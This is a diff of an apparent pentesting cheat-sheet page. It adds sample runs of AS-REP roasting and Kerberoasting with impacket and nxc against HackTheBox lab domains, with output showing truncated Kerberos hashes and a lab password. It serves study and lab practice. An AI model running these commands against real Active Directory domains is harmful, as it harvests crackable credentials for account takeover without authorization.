@@ -337,13 +337,30 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set1" data-tabcontent="tab2" >nxc</button>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames
-</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;USERS_FILE&gt; -no-pass -dc-ip &lt;DC&gt;
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers &lt;DOMAIN&gt;/ -usersfile &lt;USERS_FILE&gt; -no-pass -dc-ip &lt;DC_IP&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers ABSOLUTE.HTB/ -usersfile valid_usernames.txt -no-pass -dc-ip DC.ABSOLUTE.HTB
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] User j.roberts doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] User m.chaffrey doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] User s.osvald doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$d</span>.klay@ABSOLUTE.HTB:85554d22d5c220d8a757ce9913d207ea<span class="nv">$7288</span>c91ca ...<span class="o">[</span>SNIP<span class="o">]</span>... 0e09c5d9d1
+</span></span><span class="line"><span class="cl"><span class="go">[-] User j.robinson doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] User n.smith doesn&#39;t have UF_DONT_REQUIRE_PREAUTH set
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Single user without creds
-</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers -no-pass -dc-ip &lt;TARGET&gt; &lt;DOMAIN&gt;/&lt;USER&gt;
-</span></span></span></code></pre></div></div>
+</span></span><span class="line"><span class="cl"><span class="go">impacket-GetNPUsers -no-pass -dc-ip &lt;DC_IP&gt; &#39;&lt;DOMAIN&gt;/&lt;USER&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-GetNPUsers -no-pass -dc-ip 10.10.11.181 ABSOLUTE.HTB/d.klay
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Getting TGT for d.klay
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5asrep<span class="nv">$23$d</span>.klay@ABSOLUTE.HTB:97c9a3ec7b550c29bc52f0c176738e73<span class="nv">$ab25b07d4</span> ...<span class="o">[</span>SNIP<span class="o">]</span>... 78a8e52bb6
+</span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Multiple valid usernames
-</span></span><span class="line"><span class="cl"><span class="go">nxc ldap &lt;TARGET&gt; -u &lt;USERS_FILE&gt; -p &#39;&#39; --asreproast as_rep_hashes.txt
+</span></span><span class="line"><span class="cl"><span class="go">nxc ldap &lt;DC&gt; -u &lt;USERS_FILE&gt; -p &#39;&#39; --asreproast as_rep_hashes.txt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> nxc ldap 10.10.11.181 -u valid_usernames.txt -p <span class="s1">&#39;&#39;</span> --asreproast as_rep_hashes.txt
+</span></span><span class="line"><span class="cl"><span class="go">SMB         10.10.11.181    445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:absolute.htb) (signing:True) (SMBv1:False)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.11.181    445    DC               $krb5asrep$23$d.klay@ABSOLUTE.HTB:5a082acfc8 ...[SNIP]... 06ddb9be16
 </span></span></span></code></pre></div></div></p>
 <hr>
 <h3 id="kerberoasting-from-linux">Kerberoasting (From Linux)</h3>
@@ -352,14 +369,39 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set2" data-tabcontent="tab2" >nxc</button>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Fix <span class="nb">time</span> skew
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -dc-ip &lt;DC_IP&gt;
-</span></span></span></code></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -request &#39;&lt;DOMAIN&gt;/&lt;USER&gt;:&lt;PASSWORD&gt;&#39; -k -dc-host &lt;DC&gt;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC1.scrm.local <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -request <span class="s1">&#39;scrm.local/ksimpson:ksimpson&#39;</span> -k -dc-host DC1.scrm.local
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go">ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+</span></span></span><span class="line"><span class="cl"><span class="go">----------------------------  ------  --------  --------------------------  --------------------------  ----------
+</span></span></span><span class="line"><span class="cl"><span class="go">MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
+</span></span></span><span class="line"><span class="cl"><span class="go">MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-04 00:32:02.351452  2024-09-24 15:53:26.496449             
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] CCache file is not found. Skipping...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5tgs<span class="nv">$23$*</span>sqlsvc<span class="nv">$SCRM</span>.LOCAL<span class="nv">$scrm</span>.local/sqlsvc*<span class="nv">$b62984d5b</span> ...<span class="o">[</span>SNIP<span class="o">]</span>... f4c2161493
+</span></span></code></pre></div><p><small><em>Note: Times skew have to be within 5 minutes in kerberos</em></small></p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Kerberoasting without cred
-</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile &lt;USERS_FILE&gt; -dc-host &lt;DC_IP&gt; &lt;DOMAIN&gt;/
+</span></span><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; impacket-GetUserSPNs -no-preauth &lt;USER_WITH_DONT_REQUIRE_PREAUTH&gt; -usersfile &lt;USERS_FILE&gt; -dc-host &lt;DC&gt; &lt;DOMAIN&gt;/
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s dc01.rebound.htb <span class="o">&amp;&amp;</span> impacket-GetUserSPNs -no-preauth jjones -usersfile valid_usernames.txt -dc-host 10.10.11.231 rebound.htb/
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.13.0.dev0+20240916.171021.65b774de - Copyright Fortra, LLC and its affiliated companies 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[-] Principal: Administrator - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+</span></span></span><span class="line"><span class="cl"><span class="go">[-] Principal: Guest - Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">$</span>krb5tgs<span class="nv">$18$krbtgt$REBOUND</span>.HTB<span class="nv">$*</span>krbtgt*<span class="nv">$d989a5d49</span> ...<span class="o">[</span>SNIP<span class="o">]</span>... 962d2aa2f2
+</span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">nxc ldap &lt;DC_IP&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; --kerberoasting kerberoast_hashes.txt
+<div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">sudo ntpdate -s &lt;DC&gt; &amp;&amp; nxc ldap &lt;DC_IP&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -k --kerberoasting kerberoast_hashes.txt
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo ntpdate -s DC1.scrm.local <span class="o">&amp;&amp;</span> nxc ldap 10.10.11.168 -u ksimpson -p <span class="s1">&#39;ksimpson&#39;</span> -k --kerberoasting kerberoast_hashes.txt
+</span></span><span class="line"><span class="cl"><span class="go">LDAP        10.10.11.168    389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   [+] scrm.local\ksimpson 
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   Bypassing disabled account krbtgt 
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   [*] Total of records returned 2
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   sAMAccountName: sqlsvc memberOf:  pwdLastSet: 2021-11-04 00:32:02.351452 lastLogon:2024-09-24 15:53:26.496449
+</span></span></span><span class="line"><span class="cl"><span class="go">LDAPS       10.10.11.168    636    DC1.scrm.local   $krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$335aeba3b ...[SNIP]... 9718487474
 </span></span></span></code></pre></div></div></p>
 <h3 id="kerberoasting-from-windows">Kerberoasting (From Windows)</h3>
 <p>
